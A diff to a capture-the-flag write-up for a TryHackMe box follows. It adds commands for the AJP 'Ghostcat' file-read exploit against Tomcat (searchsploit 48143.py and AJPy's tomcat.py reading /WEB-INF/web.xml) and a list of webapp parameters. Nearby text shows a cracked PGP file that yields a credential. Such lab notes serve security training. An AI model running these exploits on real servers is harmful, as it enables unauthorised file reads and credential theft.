@@ -4,8 +4,13 @@
 `searchsploit ajp`
 `python 48143.py -f /WEB-INF/web.xml $ip` or with specific port `python 48143.py -p $port -f /WEB-INF/web.xml $ip`
 
+In this box, it uses the default port 8009 already.
+
 ### Or AJPy
-`python tomcat.py read_file /WEB-INF/web.xml $ip`
+##### Install submodules first
+`git clone --recurse-submodules git@github.com:hypn0s/AJPy.git`
+##### Now run it
+`python tomcat.py read_file --webapp=web /WEB-INF/web.xml $ip`
 
 ### Cracking PGP symmetrically encrypted files with JtR 
 https://www.openwall.com/lists/john-users/2015/11/17/1
@@ -43,4 +48,28 @@ gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
 gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
       "tryhackme <stuxnet@tryhackme.com>"
 merlin:plainTextPassword
+```
+
+
+### Thoughts
+Run the exploit is not hard but how to find the correct command parameters for that
+```
+root@ubuntu:/root# find / -name "web.xml" 2>/dev/null
+/opt/tomcat/conf/web.xml
+/opt/tomcat/webapps/host-manager/WEB-INF/web.xml
+/opt/tomcat/webapps/ROOT/WEB-INF/web.xml
+/opt/tomcat/webapps/manager/WEB-INF/web.xml
+/opt/tomcat/webapps/docs/appdev/sample/web/WEB-INF/web.xml
+/opt/tomcat/webapps/docs/WEB-INF/web.xml
+/opt/tomcat/webapps/examples/WEB-INF/web.xml
+```
+
+Available parameters
+```
+--webapp=host-manager
+--webapp=ROOT
+--webapp=manager
+--webapp=web
+--webapp=docs
+--webapp=examples
 ```
